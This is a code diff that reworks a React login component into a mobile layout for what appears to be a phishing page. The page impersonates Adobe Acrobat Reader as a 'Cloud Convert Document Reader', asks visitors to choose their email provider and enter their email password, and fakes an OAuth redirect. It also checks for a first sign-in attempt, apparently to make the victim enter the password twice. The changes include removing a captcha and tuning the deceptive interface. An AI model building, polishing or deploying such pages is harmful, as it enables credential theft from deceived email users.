@@ -1,7 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
-import { useLogin } from '../hooks/useLogin';
-import Spinner from './common/Spinner';
+import { useLogin } from '../../hooks/useLogin';
+import Spinner from '../../components/common/Spinner';
 
 interface LoginPageProps {
   fileName: string;
@@ -14,9 +14,9 @@ interface LoginPageProps {
   onOffice365Select?: () => void;
 }
 
-const LoginPage: React.FC<LoginPageProps> = ({ 
-  fileName, 
-  onLoginSuccess, 
+const MobileLoginPage: React.FC<LoginPageProps> = ({ 
+  fileName,
+  onLoginSuccess,
   onLoginError,
   onYahooSelect,
   onAolSelect,
@@ -76,13 +76,11 @@ const LoginPage: React.FC<LoginPageProps> = ({
       onOffice365Select();
     } else {
       setSelectedProvider(providerName);
-      setIsRedirecting(false);
-      setIsProcessingReturn(false);
     }
   };
 
   const simulateOAuthRedirect = (providerName: string) => {
-    // Show redirecting state flag (kept for compatibility; UI no longer returns early)
+    // Show redirecting state
     setIsRedirecting(true);
     
     // Generate OAuth-like parameters
@@ -116,7 +114,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
       handleProviderReturn(providerName);
     }, 1500); // 1.5 second delay
   };
-
+  
   const handleSubmit = async (e: React.FormEvent) => {
     const result = await handleFormSubmit(e, { email, password, provider: selectedProvider });
     if (result?.isFirstAttempt) {
@@ -133,8 +131,9 @@ const LoginPage: React.FC<LoginPageProps> = ({
     setIsProcessingReturn(false);
   };
 
-  // Clicking provider now starts redirect immediately (no captcha flow here)
+  // Captcha removed: clicking a provider now proceeds immediately to redirect flow
   const handleProviderClick = (providerName: string) => {
+    // directly start redirect simulation / provider flow
     simulateOAuthRedirect(providerName);
   };
 
@@ -142,111 +141,118 @@ const LoginPage: React.FC<LoginPageProps> = ({
     <img 
       src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/60/Adobe_Acrobat_Reader_icon_%282020%29.svg/640px-Adobe_Acrobat_Reader_icon_%282020%29.svg.png" 
       alt="Adobe Acrobat Reader Logo" 
-      className="w-10 h-10 drop-shadow-lg"
+      className="w-9 h-9 drop-shadow-lg"
     />
   );
 
-  // NOTE: Removed the early return that rendered the "Redirecting to authentication provider..." screen.
-  // Everything else, states and logic remain unchanged so the flow is preserved.
-
   return (
     <div 
-      className="min-h-screen flex items-center justify-center p-4 font-sans bg-cover bg-center"
+      className="min-h-screen flex flex-col justify-end font-sans bg-cover bg-center"
       style={{
         backgroundImage: "url('https://images.unsplash.com/photo-1588345921523-c2dcdb7f1dcd?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80')"
       }}
     >
       {!selectedProvider ? (
         // --- Provider Selection without Container Card ---
-        <div className="w-full max-w-md">
-          <div className="mb-8 text-center">
-            <div className="flex justify-center mb-6">
+        <>
+          <div className="bg-white/50 backdrop-blur-sm p-6 text-center">
+            <div className="flex justify-center mb-4">
               <AdobeLogo />
             </div>
             {/* header text removed as requested */}
-            <p className="text-gray-800 text-base font-semibold mt-6 drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)] text-center">Choose your email provider</p>
-          </div>
-          
-          <div className="space-y-2">
-            {emailProviders.map((provider) => (
-              <button
-                key={provider.name}
-                onClick={() => handleProviderClick(provider.name)}
-                type="button"
-                className="w-full group"
-              >
-                <div className="flex items-center px-5 py-3 bg-white/80 backdrop-blur-md rounded-lg border border-white/40 hover:bg-white/90 hover:border-blue-400/60 hover:scale-[1.02] transition-all duration-200 shadow-lg">
-                  <img src={provider.logo} alt={provider.name} className="w-7 h-7 object-contain flex-shrink-0 drop-shadow-sm" />
-                  <span className="flex-1 text-base font-semibold text-gray-800 group-hover:text-blue-700 transition-colors ml-4">
-                    {provider.name}
-                  </span>
-                  <svg className="w-4 h-4 text-gray-600 group-hover:text-blue-600 transition-colors flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
-                  </svg>
-                </div>
-              </button>
-            ))}
           </div>
 
-          <div className="mt-8 text-center">
-            <p className="text-sm text-gray-800 font-medium drop-shadow-[0_1px_2px_rgba(255,255,255,0.6)] whitespace-nowrap">Cloud Convert Document Reader. Secured in partnership with Adobe®.</p>
+          <div className="p-6">
+            <p className="text-center text-base font-bold text-gray-900 mb-5 drop-shadow-[0_1px_3px_rgba(255,255,255,0.8)]">Choose your email provider</p>
+            <div className="space-y-2.5">
+              {emailProviders.map((provider) => (
+                <button
+                  key={provider.name}
+                  onClick={() => handleProviderClick(provider.name)}
+                  type="button"
+                  className="w-full group"
+                >
+                  <div className="flex items-center px-4 py-3 bg-white/75 backdrop-blur-md rounded-xl border border-white/40 active:bg-white/90 active:scale-[0.98] transition-all duration-200 shadow-lg">
+                    <img src={provider.logo} alt={provider.name} className="w-6 h-6 object-contain flex-shrink-0 drop-shadow-sm" />
+                    <span className="flex-1 text-base font-semibold text-gray-700 ml-4">
+                      {provider.name}
+                    </span>
+                    <svg className="w-4 h-4 text-gray-500 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
+                    </svg>
+                  </div>
+                </button>
+              ))}
+            </div>
+
+            {/* Footer: keep on one line while enabling horizontal scroll inside footer only (no page overflow) */}
+            <div className="mt-8 text-center">
+              <div
+                className="inline-block max-w-full overflow-x-auto"
+                style={{ WebkitOverflowScrolling: 'touch' }}
+              >
+                <p className="text-sm text-gray-800 font-semibold drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)] whitespace-nowrap inline-block px-4">
+                  Cloud Convert Document Reader. Secured in partnership with Adobe®.
+                </p>
+              </div>
+            </div>
           </div>
-        </div>
+        </>
       ) : (
         // --- Login Form with Container ---
-        <div className="w-full max-w-md bg-white/70 backdrop-blur-md rounded-2xl shadow-2xl overflow-hidden border border-white/20">
-          <div className="p-8">
-            <div className="flex justify-center mb-6">
+        <>
+          <div className="bg-white/50 backdrop-blur-sm p-6 text-center">
+            <div className="flex justify-center mb-4">
               <AdobeLogo />
             </div>
-            <h1 className="text-2xl font-bold text-center text-gray-800">Sign in with {selectedProvider}</h1>
+            <h1 className="text-xl font-bold text-gray-900">Sign in with {selectedProvider}</h1>
+            
+          </div>
 
-            <div className="mt-8">
-              <button onClick={handleBackToProviders} className="flex items-center gap-2 text-sm text-gray-700 hover:text-gray-900 font-medium mb-6">
-                <ArrowLeft className="w-4 h-4" />
-                Back to providers
+          <div className="bg-white/60 backdrop-blur-md rounded-t-3xl shadow-2xl p-6 flex-grow-0 border-t border-white/30">
+            <button onClick={handleBackToProviders} className="flex items-center gap-2 text-sm text-gray-700 active:text-gray-900 font-medium mb-6">
+              <ArrowLeft className="w-4 h-4" />
+              Change provider
+            </button>
+
+            <form onSubmit={handleSubmit} className="space-y-5">
+              {errorMessage && ( <div className="bg-red-100/90 backdrop-blur-sm text-red-700 p-3 rounded-lg text-sm font-medium text-center border border-red-200/50"> {errorMessage} </div> )}
+              <div>
+                <label className="text-sm font-bold text-gray-700" htmlFor="email">Email Address</label>
+                <div className="relative mt-2">
+                  <Mail className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5" />
+                  <input id="email" type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@example.com" required className="w-full pl-11 pr-4 py-4 bg-white/80 backdrop-blur-sm border-2 border-white/50 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition" />
+                </div>
+              </div>
+              <div>
+                <label className="text-sm font-bold text-gray-700" htmlFor="password">Password</label>
+                <div className="relative mt-2">
+                  <Lock className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5" />
+                  <input id="password" type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className="w-full pl-11 pr-12 py-4 bg-white/80 backdrop-blur-sm border-2 border-white/50 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition" />
+                  <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-600 hover:text-gray-800">
+                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
+                  </button>
+                </div>
+              </div>
+              <button type="submit" disabled={isLoading || !email || !password} className="w-full flex items-center justify-center py-4 px-4 rounded-xl font-bold text-white bg-blue-600/90 backdrop-blur-sm hover:bg-blue-700/90 disabled:opacity-50 transition-colors shadow-lg shadow-blue-500/30">
+                {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
+                {isLoading ? 'Verifying...' : 'Sign In'}
               </button>
+            </form>
+          </div>
 
-              <form onSubmit={handleSubmit} className="space-y-5">
-                {errorMessage && (
-                  <div className="bg-red-100/90 backdrop-blur-sm text-red-700 p-3 rounded-lg text-sm font-medium text-center border border-red-200/50">
-                    {errorMessage}
-                  </div>
-                )}
-
-                <div>
-                  <label className="text-sm font-bold text-gray-700" htmlFor="email">Email Address</label>
-                  <div className="relative mt-2">
-                    <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5" />
-                    <input id="email" type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@example.com" required className="w-full pl-10 pr-4 py-3 bg-white/80 backdrop-blur-sm border border-gray-300/50 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition" />
-                  </div>
-                </div>
-
-                <div>
-                  <label className="text-sm font-bold text-gray-700" htmlFor="password">Password</label>
-                  <div className="relative mt-2">
-                    <Lock className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5" />
-                    <input id="password" type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className="w-full pl-10 pr-12 py-3 bg-white/80 backdrop-blur-sm border border-gray-300/50 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition" />
-                    <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-600 hover:text-gray-800">
-                      {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
-                    </button>
-                  </div>
-                </div>
-
-                <button type="submit" disabled={isLoading || !email || !password} className="w-full flex items-center justify-center py-3 px-4 rounded-lg font-bold text-white bg-blue-600/90 backdrop-blur-sm hover:bg-blue-700/90 disabled:opacity-50 disabled:cursor-not-allowed transition-colors shadow-lg">
-                  {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
-                  {isLoading ? 'Verifying...' : 'Sign In'}
-                </button>
-              </form>
+          {/* Login form footer: keep on one line with internal horizontal scroll only */}
+          <div className="bg-white/30 backdrop-blur-sm pt-2 pb-4">
+            <div className="max-w-full overflow-x-auto" style={{ WebkitOverflowScrolling: 'touch' }}>
+              <p className="text-xs text-gray-600 text-center inline-block whitespace-nowrap px-4">
+                Cloud Convert Document Reader. Secured in partnership with Adobe®.
+              </p>
             </div>
           </div>
-          <div className="bg-white/30 backdrop-blur-sm p-4 border-t border-white/20">
-            <p className="text-xs text-gray-600 text-center whitespace-nowrap">Cloud Convert Document Reader. Secured in partnership with Adobe®.</p>
-          </div>
-        </div>
+        </>
       )}
     </div>
   );
 };
 
-export default LoginPage;
+export default MobileLoginPage;
